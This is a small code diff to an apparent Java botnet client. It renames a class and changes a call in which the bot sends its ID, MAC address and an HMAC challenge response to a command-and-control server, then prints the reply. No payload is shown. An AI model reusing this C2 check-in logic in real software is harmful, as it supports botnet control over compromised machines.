@@ -25,7 +25,7 @@ import javassist.bytecode.ByteArray;
 import javassist.compiler.SymbolTable;
 
 @Service
-public class Bot {
+public class BotInitialize {
 
 	@Autowired
 	private Engine engineBot;
@@ -42,7 +42,7 @@ public class Bot {
 	@Autowired
 	private FileUtil fileUtil;
 
-	public Bot() {
+	public BotInitialize() {
 	}
 
 	public void initializeBot() throws IOException {
@@ -94,7 +94,7 @@ public class Bot {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(),networkService.getMac(),networkService.getCommandConquerIps().getIPList().get(0), challenge.getValue1(),challenge.getValue2(), hashMac);
+			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(),networkService.getMac(),networkService.getCommandConquerIps().getIPList().get(0),hashMac);
 			System.out.println("La risposta del CeC: " + response);
 
 		}
